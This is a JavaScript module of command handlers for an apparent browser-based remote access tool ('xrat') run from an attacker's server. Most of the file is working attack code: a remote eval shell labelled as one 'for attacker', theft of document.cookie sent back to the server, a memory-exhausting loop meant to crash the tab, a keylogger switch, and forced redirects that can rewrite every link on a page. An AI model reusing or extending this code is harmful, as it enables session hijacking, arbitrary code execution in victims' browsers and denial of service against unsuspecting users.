define(['utils','command'], function(utils, command){


	/*===============================================================

	Basic Commands go here. Anything that is less than 5 lines
	and a perform function can qualify as a basic command.
	Longer, more complex commands should be written inside their 
	own file, or in a file that holds multiple related commands.
	Example: portscanning and router attacks can both live in a 
	file named network.js.

	The factory method takes a name for the command as the first
	argument and an object as the second
	The command will then be referenced from the command.modules.*name*

	IMPORTANT: The name given to the command must be the same as the
	string used to denote the command type (the 0th item in the command
	array from the servers JSON response).

	Try to keep it alphabetical

	Command Modules contained here:
	-------------------------------
	alert
	alert2
	crash
	cookie
	dos
	keylogger (on/off)
	pollspeed
	redirect
	shell
	video
	websocket (on/off)
	
	================================================================*/

	command.
	factory('alert', { // Basic Alert Message
		perform: function(){
			alert(this.data);
			this.result = 'alert completed';
			this.complete();
		}
	}).
	factory('alert2', { // Fancy Alert Message. Twitter Bootstrap Modal
		perform: function(){
			alert(this.data[0]);
			alert(this.data[1]);
			this.complete();
		}
	}).
	factory('crash', { // Attempts to crash browser/tab by assinging lots o memory
		perform: function(){
			txt = "a";
			while(1){
				txt = txt += "a";
			}
		}
	}).
	factory('cookie', { // Just send cookie and the domain back
		perform: function(){
			this.result = document.cookie;
			console.log(this.result);
			this.tcomplete();
		}
	}).
	factory('deface', {
		perform: function(){

		}
	}).
	factory('keylogger', { // Turn the keylogger on or off.
		perform: function(){
			// This command doesn't actually do the keylogging, it just switches it on and off.
			// Keylogging is performed in the background constantly when active, and sends its
			// logs back to the server periodically and on before actions taken, like clicking links
		}
	}).
	factory('pollspeed', { // Change polling Speed.
		perform: function(){
			var ns = this.data[0];
			if(utils.isNum(ns)){
				xrat.pollSpeed = ns;
			}
			this.complete();
		}
	}).
	factory('redirect', { // Shocker, redirect to another page
		perform: function(){
			if(this.data[1] === 'replace'){ // different method of redirecting. replace all links on page with redirect link
				utils.replaceLinks('href',this.data[0]);
			}
			else if(this.data[1] === 'iframe'){
				utils.fullscreenIframe(this.data[0]);
			}
			else{ window.location = this.data[0]; }
			this.tcomplete();
		}
	}).
	factory('shell', { // Provides a direct javascript shell for attacker, EVAL
		perform: function(){
			console.log(this.data);
			var test = eval(this.data);
			if(typeof test !== 'undefined'){
				this.result = test.toString();
			}
			else{
				this.result = 'undefined'
			}
			
			this.complete();
		}
	}).
	factory('video', { // Play a youtube video on the page.
		perform: function(){
			console.log("creating video page");
			var vurl = this.data;
			var htmls = '<iframe id="ytplayer" type="text/html" width="853" height="480" src="http://www.youtube.com/embed/' + vurl + '?autoplay=1" frameborder="0"/>'

			$('body').html(htmls);
			this.complete();
		}
	}).
	factory('websocket', { // Set the communication method to use websockets
		perform: function(){
			
		}
	});
	

});